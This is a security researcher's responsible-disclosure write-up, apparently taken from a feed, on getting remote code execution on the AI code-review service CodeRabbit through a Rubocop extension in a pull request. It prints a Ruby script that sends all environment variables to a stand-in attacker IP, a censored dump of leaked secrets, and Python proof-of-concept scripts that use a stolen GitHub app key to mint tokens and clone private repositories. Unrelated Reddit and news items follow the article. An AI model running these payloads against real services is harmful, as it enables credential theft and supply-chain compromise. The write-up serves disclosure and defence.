href=\"https://www.coderabbit.ai/\">CodeRabbit</a> is an AI code review tool. Their website mentions it’s the most installed <a href=\"https://github.com/marketplace?type=apps&amp;category=ai-assisted\">AI app on GitHub</a> &amp; Gitlab, with 1 million repositories in review and 5 million pull requests reviewed.</p><p>Indeed, CodeRabbit is the most installed GitHub app in the AI Assisted category on GitHub Marketplace. It is also on the first page of the most installed GitHub apps overall across all categories on <a href=\"https://github.com/marketplace?type=apps\">GitHub Marketplace</a>.</p><p>Once CodeRabbit is installed on a repository, every time a new pull request (PR) is created or updated, CodeRabbit will analyze the code changes in the PR and review them using AI. CodeRabbit will finally post its code review as a comment on the pull request, where the developer can read it.</p><p>This is a very useful developer productivity tool that can summarize PRs, find security issues in the code, suggest code improvements or even document the code or illustrate it by generating diagrams. It can save developers a lot of time.</p><p>CodeRabbit has multiple pricing plans, and one of them is called Pro. That one includes support for linters and SAST tools, such as Semgrep. Alternatively, there’s a free 14-day trial for the Pro plan. Also, the Pro plan comes for free for people working on open source projects.</p><p>I registered for the free trial and logged in using my GitHub account.</p><p>When first logging into CodeRabbit using GitHub, the application asks to install and authorize on a personal GitHub account. The user is asked to select which repositories CodeRabbit should be installed to. The user can also review the permissions that the CodeRabbit GitHub app will be granted. Namely, read and write access to code in the selected repositories.</p><p>At this point, this sounded very similar to what happened with Qodo Merge. I had to look into it. If somehow we could leak the GitHub API token, we would get read and write access to the repository in which CodeRabbit was installed.</p><p>I immediately created a private GitHub repository on my personal GitHub account and granted CodeRabbit access to that new repository so that it starts reviewing my PRs on that repo.</p><p>In order to get more familiar with CodeRabbit’s features and how to use them, I created a PR and saw that a comment containing a code review was posted by the CodeRabbit bot. Here are a few screenshots of what CodeRabbit generated.</p><p>Now that I had a better idea of how it worked, I could start looking for vulnerabilities. </p><p>I had a look at the official CodeRabbit documentation and noticed that CodeRabbit supported running <a href=\"https://docs.coderabbit.ai/tools/\">dozens of static analysis tools</a>. These are the linters and SAST tools mentioned on the CodeRabbit pricing page discussed above.</p><p>CodeRabbit runs these tools on your PR changes depending on a few conditions:</p><ul><li>The tool is enabled in the CodeRabbit configuration</li><li>The PR contains large enough changes to trigger a run of such tools. Small changes will be ignored and no tool will run on those</li><li>The PR contains files supported by the tool. For example, PHPStan will only run on files with the  extension</li></ul><p>Some tools are enabled by default and will run if corresponding files exist. Otherwise, a  file placed in the repository can be used to configure which tools should be enabled. Alternatively, the CodeRabbit web app settings can be used to configure tools.</p><p>The documentation page also states that each tool can be configured by providing a path to a configuration file read by the tool. Now we’re talking!</p><p>Since CodeRabbit executes these external tools, if any of these tools have a way to inject code, we may be able to run arbitrary code. So I glanced over the list of supported tools and found an interesting target: <a href=\"https://docs.coderabbit.ai/tools/rubocop\">Rubocop</a>, a Ruby static analyzer. The CodeRabbit documentation page for Rubocop states that Rubocop will run on Ruby files () in the repository. It also says that CodeRabbit will look for a  file anywhere in the repository and pass it to Rubocop.</p><p>Looking at Rubocop’s documentation, we see that it supports <a href=\"https://docs.rubocop.org/rubocop/1.69/extensions.html\">extensions</a>. One can use the Rubocop configuration file to specify the path to an extension Ruby file, for example, , which will be loaded and executed by Rubocop. To do so, one can include the following snippet in :</p><p>In , we can write arbitrary Ruby code that will be loaded and executed when Rubocop runs. We’ll use 1.2.3.4 as an example IP address that stands in for an attacker-controlled system. For example, the following Ruby script will collect the environment variables and send them to an attacker-controlled server at :</p><div><pre title=\"\">require 'net/http'\nrequire 'uri'\nrequire 'json'\n\n# Collect environment variables\nenv_vars = ENV.to_h\n\n# Convert environment variables to JSON format\njson_data = env_vars.to_json\n\n# Define the URL to send the HTTP POST request\nurl = URI.parse('http://1.2.3.4/')\n\nbegin\n  # Create the HTTP POST request\n  http = Net::HTTP.new(url.host, url.port)\n  request = Net::HTTP::Post.new(url.path)\n  request['Content-Type'] = 'application/json'\n  request.body = json_data\n\n  # Send the request\n  response = http.request(request)\nrescue StandardError =&gt; e\n  puts \"An error occurred: #{e.message}\"\nend\n</pre></div><p>Exploiting this is as simple as following these steps:</p><ul><li>Get a free trial on CodeRabbit and register using a personal GitHub account</li><li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li><li>Create a PR that contains the following files:\n<ul><li>A  file as shown above</li><li>An  file as shown above</li><li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li></ul></li><li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li><li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li></ul><p>Here’s an illustration of our malicious pull request to better understand how it works:</p><article><div><div><pre>\n\nputs \"hello\"\n      </pre></div><div><pre>\n\nrequire:\n  ./ext.rb\n      </pre></div><div><pre></pre></div></div><p>\n    An illustration of what the malicious pull request looks like\n  </p></article><p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p><p>On the server at , the following JSON payload containing environment variables was received:</p><div><pre title=\"\">{\n  \"ANTHROPIC_API_KEYS\": \"sk-ant-api03-(CENSORED)\",\n  \"ANTHROPIC_API_KEYS_FREE\": \"sk-ant-api03-(CENSORED)\",\n  \"ANTHROPIC_API_KEYS_OSS\": \"sk-ant-api03-(CENSORED)\",\n  \"ANTHROPIC_API_KEYS_PAID\": \"sk-ant-api03-(CENSORED)\",\n  \"ANTHROPIC_API_KEYS_TRIAL\": \"sk-ant-api03-(CENSORED)\",\n  \"APERTURE_AGENT_ADDRESS\": \"(CENSORED)\",\n  \"APERTURE_AGENT_KEY\": \"(CENSORED)\",\n  \"AST_GREP_ESSENTIALS\": \"ast-grep-essentials\",\n  \"AST_GREP_RULES_PATH\": \"/home/jailuser/ast-grep-rules\",\n  \"AWS_ACCESS_KEY_ID\": \"\",\n  \"AWS_REGION\": \"\",\n  \"AWS_SECRET_ACCESS_KEY\": \"\",\n  \"AZURE_GPT4OMINI_DEPLOYMENT_NAME\": \"\",\n  \"AZURE_GPT4O_DEPLOYMENT_NAME\": \"\",\n  \"AZURE_GPT4TURBO_DEPLOYMENT_NAME\": \"\",\n  \"AZURE_O1MINI_DEPLOYMENT_NAME\": \"\",\n  \"AZURE_O1_DEPLOYMENT_NAME\": \"\",\n  \"AZURE_OPENAI_API_KEY\": \"\",\n  \"AZURE_OPENAI_ENDPOINT\": \"\",\n  \"AZURE_OPENAI_ORG_ID\": \"\",\n  \"AZURE_OPENAI_PROJECT_ID\": \"\",\n  \"BITBUCKET_SERVER_BOT_TOKEN\": \"\",\n  \"BITBUCKET_SERVER_BOT_USERNAME\": \"\",\n  \"BITBUCKET_SERVER_URL\": \"\",\n  \"BITBUCKET_SERVER_WEBHOOK_SECRET\": \"\",\n  \"BUNDLER_ORIG_BUNDLER_VERSION\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_BUNDLE_BIN_PATH\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_BUNDLE_GEMFILE\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_GEM_HOME\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_GEM_PATH\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_MANPATH\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_PATH\": \"/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n  \"BUNDLER_ORIG_RB_USER_INSTALL\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_RUBYLIB\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"BUNDLER_ORIG_RUBYOPT\": \"BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL\",\n  \"CI\": \"true\",\n  \"CLOUD_API_URL\": \"https://(CENSORED)\",\n  \"CLOUD_RUN_TIMEOUT_SECONDS\": \"3600\",\n  \"CODEBASE_VERIFICATION\": \"true\",\n  \"CODERABBIT_API_KEY\": \"\",\n  \"CODERABBIT_API_URL\": \"https://(CENSORED)\",\n  \"COURIER_NOTIFICATION_AUTH_TOKEN\": \"(CENSORED)\",\n  \"COURIER_NOTIFICATION_ID\": \"(CENSORED)\",\n  \"DB_API_URL\": \" https://(CENSORED)\",\n  \"ENABLE_APERTURE\": \"true\",\n  \"ENABLE_DOCSTRINGS\": \"true\",\n  \"ENABLE_EVAL\": \"false\",\n  \"ENABLE_LEARNINGS\": \"\",\n  \"ENABLE_METRICS\": \"\",\n  \"ENCRYPTION_PASSWORD\": \"(CENSORED)\",\n  \"ENCRYPTION_SALT\": \"(CENSORED)\",\n  \"FIREBASE_DB_ID\": \"\",\n  \"FREE_UPGRADE_UNTIL\": \"2025-01-15\",\n  \"GH_WEBHOOK_SECRET\": \"(CENSORED)\",\n  \"GITHUB_APP_CLIENT_ID\": \"(CENSORED)\",\n  \"GITHUB_APP_CLIENT_SECRET\": \"(CENSORED)\",\n  \"GITHUB_APP_ID\": \"(CENSORED)\",\n  \"GITHUB_APP_NAME\": \"coderabbitai\",\n  \"GITHUB_APP_PEM_FILE\": \"-----BEGIN RSA PRIVATE KEY-----\\n(CENSORED)-\\n-----END RSA PRIVATE KEY-----\\n\",\n  \"GITHUB_CONCURRENCY\": \"8\",\n  \"GITHUB_ENV\": \"\",\n  \"GITHUB_EVENT_NAME\": \"\",\n  \"GITHUB_TOKEN\": \"\",\n  \"GITLAB_BOT_TOKEN\": \"(CENSORED)\",\n  \"GITLAB_CONCURRENCY\": \"8\",\n  \"GITLAB_WEBHOOK_SECRET\": \"\",\n  \"HOME\": \"/root\",\n  \"ISSUE_PROCESSING_BATCH_SIZE\": \"30\",\n  \"ISSUE_PROCESSING_START_DATE\": \"2023-06-01\",\n  \"JAILUSER\": \"jailuser\",\n  \"JAILUSER_HOME_PATH\": \"/home/jailuser\",\n  \"JIRA_APP_ID\": \"(CENSORED)\",\n  \"JIRA_APP_SECRET\": \"(CENSORED)\",\n  \"JIRA_CLIENT_ID\": \"(CENSORED)\",\n  \"JIRA_DEV_CLIENT_ID\": \"(CENSORED)\",\n  \"JIRA_DEV_SECRET\": \"(CENSORED)\",\n  \"JIRA_HOST\": \"\",\n  \"JIRA_PAT\": \"\",\n  \"JIRA_SECRET\": \"(CENSORED)\",\n  \"JIRA_TOKEN_URL\": \"https://auth.atlassian.com/oauth/token\",\n  \"K_CONFIGURATION\": \"pr-reviewer-saas\",\n  \"K_REVISION\": \"pr-reviewer-saas-(CENSORED)\",\n  \"K_SERVICE\": \"pr-reviewer-saas\",\n  \"LANGCHAIN_API_KEY\": \"(CENSORED)\",\n  \"LANGCHAIN_PROJECT\": \"default\",\n  \"LANGCHAIN_TRACING_SAMPLING_RATE_CR\": \"50\",\n  \"LANGCHAIN_TRACING_V2\": \"true\",\n  \"LANGUAGETOOL_API_KEY\": \"(CENSORED)\",\n  \"LANGUAGETOOL_USERNAME\": \"(CENSORED)\",\n  \"LD_LIBRARY_PATH\": \"/usr/local/lib:/usr/lib:/lib:/usr/libexec/swift/5.10.1/usr/lib\",\n  \"LINEAR_PAT\": \"\",\n  \"LLM_PROVIDER\": \"\",\n  \"LLM_TIMEOUT\": \"300000\",\n  \"LOCAL\": \"false\",\n  \"NODE_ENV\": \"production\",\n  \"NODE_VERSION\": \"22.9.0\",\n  \"NPM_CONFIG_REGISTRY\": \"http://(CENSORED)\",\n  \"OAUTH2_CLIENT_ID\": \"\",\n  \"OAUTH2_CLIENT_SECRET\": \"\",\n  \"OAUTH2_ENDPOINT\": \"\",\n  \"OPENAI_API_KEYS\": \"sk-proj-(CENSORED)\",\n  \"OPENAI_API_KEYS_FREE\": \"sk-proj-(CENSORED)\",\n  \"OPENAI_API_KEYS_OSS\": \"sk-proj-(CENSORED)\",\n  \"OPENAI_API_KEYS_PAID\": \"sk-proj-(CENSORED)\",\n  \"OPENAI_API_KEYS_TRIAL\": \"sk-proj-(CENSORED)\",\n  \"OPENAI_BASE_URL\": \"\",\n  \"OPENAI_ORG_ID\": \"\",\n  \"OPENAI_PROJECT_ID\": \"\",\n  \"PATH\": \"/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n  \"PINECONE_API_KEY\": \"(CENSORED)\",\n  \"PINECONE_ENVIRONMENT\": \"us-central1-gcp\",\n  \"PNPM_HOME\": \"/pnpm\",\n  \"PORT\": \"8080\",\n  \"POSTGRESQL_DATABASE\": \"(CENSORED)\",\n  \"POSTGRESQL_HOST\": \"(CENSORED)\",\n  \"POSTGRESQL_PASSWORD\": \"(CENSORED)\",\n  \"POSTGRESQL_USER\": \"(CENSORED)\",\n  \"PWD\": \"/inmem/21/d277c149-9d6a-4dde-88cc-03f724b50e2d/home/jailuser/git\",\n  \"REVIEW_EVERYTHING\": \"false\",\n  \"ROOT_COLLECTION\": \"\",\n  \"SELF_HOSTED\": \"\",\n  \"SELF_HOSTED_KNOWLEDGE_BASE\": \"\",\n  \"SELF_HOSTED_KNOWLEDGE_BASE_BRANCH\": \"\",\n  \"SENTRY_DSN\": \"https://(CENSORED)\",\n  \"SERVICE_NAME\": \"pr-reviewer-saas\",\n  \"SHLVL\": \"0\",\n  \"TELEMETRY_COLLECTOR_URL\": \"https://(CENSORED)\",\n  \"TEMP_PATH\": \"/inmem\",\n  \"TINI_VERSION\": \"v0.19.0\",\n  \"TRPC_API_BASE_URL\": \"https://(CENSORED)\",\n  \"VECTOR_COLLECTION\": \"\",\n  \"YARN_VERSION\": \"1.22.22\",\n  \"_\": \"/usr/local/bin/rubocop\"\n}\n</pre></div><p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p><ul><li>Anthropic API keys (free, oss, paid, trial, etc.)</li><li>OpenAI API keys (free, oss, paid, trial, etc.)</li><li>Encryption password and salt</li><li>Gitlab personal access token</li><li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li><li>Langchain/langsmith API key</li><li>PostgreSQL database host, username and password</li></ul><p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p><p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<p>But there was more. Let’s go back to the exfiltrated environment variables.</p></p><p>As mentioned above, one of the environment variables was named  and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p><p>Let’s go through a few operations that one can perform with this private key.</p><h3>Listing installations of the CodeRabbit app</h3><p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p><p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p><p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p><h3>Listing GitHub repositories CodeRabbit has access to</h3><p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p><p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p><div><pre title=\"\">\"permissions\": {\n    \"actions\": \"read\",\n    \"checks\": \"read\",\n    \"contents\": \"write\",\n    \"discussions\": \"read\",\n    \"issues\": \"write\",\n    \"members\": \"read\",\n    \"metadata\": \"read\",\n    \"pull_requests\": \"write\",\n    \"statuses\": \"write\"\n  },\n</pre></div><p>Note that these permissions are public information that anyone can <a href=\"https://api.github.com/apps/coderabbitai\">see here</a>.</p><h3>Generating an access token valid for repositories that CodeRabbit has access to</h3><p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the . This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p><p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p><h3>Cloning private repositories CodeRabbit has access to</h3><p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p><p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called  and that we have the app ID and client ID (also leaked from the environment variables):</p><div><pre title=\"\">#!/usr/bin/env python3  \nimport json  \nimport time  \n\nimport jwt  \nimport requests  \nfrom github import Auth, GithubIntegration  \n\nwith open(\"priv.pem\", \"r\") as f:  \n    signing_key = f.read()  \n\napp_id = \"TODO_insert_app_id_here\"  \nclient_id = \"Iv1.TODO_insert_client_id_here\"  \n\n\ndef gen_jwt():  \n    payload = {  \n        # Issued at time  \n        'iat': int(time.time() - 60),  \n        # JWT expiration time (10 minutes maximum)  \n        'exp': int(time.time()) + 600 - 60,  \n        # GitHub App's client ID  \n        'iss': client_id  \n    }  \n\n    # Create JWT  \n    encoded_jwt = jwt.encode(payload, signing_key, algorithm=\"RS256\")  \n    return encoded_jwt  \n\n\ndef create_access_token(install_id, jwt):  \n    response = requests.post(  \n        f\"https://api.github.com/app/installations/{install_id}/access_tokens\",  \n        headers={  \n            \"Accept\": \"application/vnd.github+json\",  \n            \"Authorization\": f\"Bearer {jwt}\",  \n            \"X-GitHub-Api-Version\": \"2022-11-28\",  \n        }  \n    )  \n    j = response.json()  \n    access_token = j[\"token\"]  \n    return access_token  \n\n\ndef auth():  \n    auth = Auth.AppAuth(app_id, signing_key)  \n    gi = GithubIntegration(auth=auth)  \n    app = gi.get_app()  \n\n    # iterate through app installations, get the first 5  \n    for installation in gi.get_installations().reversed[:5]:  \n        install_id = installation.id  \n\n    # or access an installation by its ID directly  \n    installation = gi.get_app_installation(install_id)  \n\n    jwt = gen_jwt()  \n    create_access_token(install_id, jwt)  \n\n    # get all github repositories this installation has access to  \n    repos = installation.get_repos()  \n    for repo in repos:  \n        full_name = repo.full_name  \n        stars = repo.stargazers_count  \n        html_url = repo.html_url  \n        is_private_repo = repo.private  \n        clone_url = f\"https://x-access-token:{access_token}@github.com/{full_name}.git\"  \n        print(clone_url)  \n\n        # repo can be cloned with \"git clone {clone_url}\"  \n        # access token is valid for 10 minutes, but a new one can be generated whenever needed  \n\nif __name__ == \"__main__\":  \n    auth()\n</pre></div><p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p><p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p><p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p><p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo () or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p><p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p><div><pre title=\"\">#!/usr/bin/env python3  \nimport time  \n\nimport jwt  \nimport requests  \nfrom github import Auth, GithubIntegration  \n\nwith open(\"priv.pem\", \"r\") as f:  \n    signing_key = f.read()  \n\napp_id = \"CENSORED\"  \nclient_id = \"CENSORED\"  \n\n\ndef gen_jwt():  \n    payload = {  \n        # Issued at time  \n        'iat': int(time.time() - 60),  \n        # JWT expiration time (10 minutes maximum)  \n        'exp': int(time.time()) + 600 - 60,  \n        # GitHub App's client ID  \n        'iss': client_id  \n    }  \n\n    # Create JWT  \n    encoded_jwt = jwt.encode(payload, signing_key, algorithm=\"RS256\")  \n    return encoded_jwt  \n\n\ndef auth():  \n    auth = Auth.AppAuth(app_id, signing_key)  \n    gi = GithubIntegration(auth=auth)  \n\n    # Target a specific Github organization that uses CodeRabbit  \n    org = \"coderabbitai\"    \n    installation = gi.get_org_installation(org)  \n\n    # Target a specific Github user that uses CodeRabbit\n    # user = \"amietn\"  \n    # installation = gi.get_user_installation(user)  \n\n    print(installation.id)  \n    gen_token = True  \n\n    if gen_token:  \n        jwt = gen_jwt()  \n        response = requests.post(  \n            f\"https://api.github.com/app/installations/{installation.id}/access_tokens\",  \n            headers={  \n                \"Accept\": \"application/vnd.github+json\",  \n                \"Authorization\": f\"Bearer {jwt}\",  \n                \"X-GitHub-Api-Version\": \"2022-11-28\",  \n            }  \n        )  \n        j = response.json()  \n        access_token = j[\"token\"]  \n\n    repos = installation.get_repos()  \n    print(\"---repos---\")  \n    for repo in repos:  \n        full_name = repo.full_name  \n        html_url = repo.html_url  \n        private = repo.private  \n        if private:  \n            print(f\"* {full_name} ({private=}) - {html_url}\")  \n\n            if gen_token:  \n                clone_url = f\"https://x-access-token:{access_token}@github.com/{full_name}.git\"  \n                print(clone_url)  \n\n\nif __name__ == \"__main__\":  \n    auth()\n</pre></div><p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p><p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p><p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p><ul><li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li><li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li><li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li><li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li></ul><p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p><p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p><p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p><p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p><p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p><p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p><p>Here is a summary of the disclosure timeline:</p><ul><li>January 24, 2025:\n<ul><li>Disclose vulnerability to CodeRabbit</li><li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li></ul></li><li>January 30, 2025:\n</li></ul><p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p><p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>","contentLength":29567,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1muvk0j/how_we_exploited_coderabbit_from_a_simple_pr_to/"},{"title":"[D] OOM when I continue training from checkpoint","url":"https://www.reddit.com/r/MachineLearning/comments/1muuzw6/d_oom_when_i_continue_training_from_checkpoint/","date":1755637412,"author":"/u/New-Skin-5064","guid":233502,"unread":true,"content":"<p>I am using the Kaggle TPU to pretrain a 930m model. Because Kaggle limits TPU sessions to 9 hours, I take the last checkpoint and resume from it in a fresh session. When I take the checkpoint from my first session and try to resume from it, I get an OOM when I run loss.item(the model loaded fine). This did not happen when I was running my pipeline to train 345m/120m models. I resume by loading the dataloader state and repeatedly iterating over it until I reach the current step. How can I avoid this OOM?</p><p>I tried to use distributed checkpointing, but this did nothing. I also tried running xm.mark_step after loading each dummy batch from the dataloader and after each gradient accumulation step.</p>","contentLength":699,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Use your old laptop as a server with WakeMyPotato!","url":"https://www.reddit.com/r/linux/comments/1muuqix/use_your_old_laptop_as_a_server_with_wakemypotato/","date":1755636842,"author":"/u/pgilah","guid":234362,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Javadoc is getting a dark mode!","url":"https://github.com/openjdk/jdk/pull/26185","date":1755635079,"author":"/u/davidalayachew","guid":233531,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1muty3h/javadoc_is_getting_a_dark_mode/"},{"title":"Ex-Google exec says degrees in law and medicine are a waste of time because they take so long to complete that AI will catch up by graduation","url":"https://fortune.com/2025/08/18/ex-google-exec-ai-founder-jad-tarifi-advanced-degrees-phd-waste-of-time-higher-education-becoming-obsolue/","date":1755633763,"author":"/u/fortune","guid":233505,"unread":true,"content":"<p>“AI itself is going to be gone by the time you finish a PhD. Even things like applying AI to robotics will be solved by then,” Jad Tarifi, the founder of Google’s first generative-AI team, told <a href=\"https://www.businessinsider.com/google-ai-team-too-late-phd-ai-hype-jad-tarifi-2025-8\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://www.businessinsider.com/google-ai-team-too-late-phd-ai-hype-jad-tarifi-2025-8\">Business Insider</a></p><p>Tarifi himself graduated with a PhD in AI in 2012, when the subject was far less mainstream. But today, the 42-year-old says, time would be better spent studying a more niche topic intertwined with AI, like AI for biology—or maybe not a degree at all.\n\n\n\n</p><p>“Higher education as we know it is on the verge of becoming obsolete,” Tarifi said to . “Thriving in the future will come not from collecting credentials but from cultivating unique perspectives, agency, emotional awareness, and strong human bonds.\n\n\n\n</p><p>“I encourage young people to focus on two things: the art of connecting deeply with others, and the inner work of connecting with themselves.”</p><h2>Tech’s warning for education on the changing AI tide</h2><p>Even studying to become a <a href=\"https://fortune.com/2025/07/23/ai-medicine-research-automation-hospital-training/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/07/23/ai-medicine-research-automation-hospital-training/\">medical doctor</a> or <a href=\"https://fortune.com/2025/07/23/ai-law-legal-lawyers-automation-court/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/07/23/ai-law-legal-lawyers-automation-court/\">lawyer</a> may not be worth ambitious Gen Z’s time anymore. Those degrees take so long to complete in comparison with how quickly AI is evolving that they may result in students just “throwing away” years of their lives, Tarifi added to BI.&nbsp;\n\n\n\n</p><p>“In the current medical system, what you learn in medical school is so outdated and based on memorization,” he said.\n\n\n\n</p><p>Tarifi is not alone in his feeling that higher education is not keeping up with the shifting AI tides. In fact, many tech leaders have recently expressed concerns that the rising cost of school paired with an outdated curriculum is creating a perfect storm for an unprepared workforce.\n\n\n\n</p><p>“I’m not sure that college is preparing people for the jobs that they need to have today,” said <a href=\"https://fortune.com/article/mark-zuckerberg-college-not-preparing-students-job-market-debt-burden/\" target=\"_self\" aria-label=\"Go to 